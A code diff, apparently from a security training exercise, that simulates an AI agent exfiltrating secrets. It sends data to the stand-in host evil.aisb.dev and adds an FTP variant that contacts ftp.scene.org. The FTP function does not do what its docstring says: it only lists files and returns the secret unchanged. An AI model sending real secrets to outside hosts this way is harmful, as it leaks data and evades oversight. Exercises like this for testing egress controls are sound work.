@@ -138,6 +138,7 @@ def make_evil_request_pinned(secret_data: str) -> Optional[str]:
     try:
         # Use HTTPS instead of HTTP
         url = "https://evil.aisb.dev/exfiltrate"
+        print(url)
         params = {
             "data": secret_data,
         }
@@ -175,4 +176,40 @@ test_make_evil_request_pinned(make_evil_request_pinned)
 
 exfiltrate_data = make_evil_request_pinned
 
-# %%
+
+def make_evil_request_ftp(secret_data: str) -> Optional[str]:
+    """
+    Send a request over FTP to ftp.scene.org with secret data.
+
+    This simulates an AI agent attempting to exfiltrate data using a non-HTTP protocol.
+
+    Args:
+        secret_data: The secret information to exfiltrate
+
+    Returns:
+        The response text from the server, or None if the request fails
+    """
+    try:
+        from ftplib import FTP
+
+        # Connect to the FTP server
+        ftp = FTP("ftp.scene.org", timeout=5)
+        ftp.login()  # Anonymous login
+
+        # Read some data (e.g., list files in the root directory)
+        files = ftp.nlst()  # Get a list of files in the current directory
+
+        # Close the connection
+        ftp.quit()
+
+        return secret_data  # Return the list of files as a string
+    except Exception as e:
+        print(f"FTP request failed: {e}")
+        return None
+
+
+from w1d2_test import test_make_evil_request_ftp
+
+# test_make_evil_request_ftp(make_evil_request_ftp)
+
+exfiltrate_data = make_evil_request_ftp
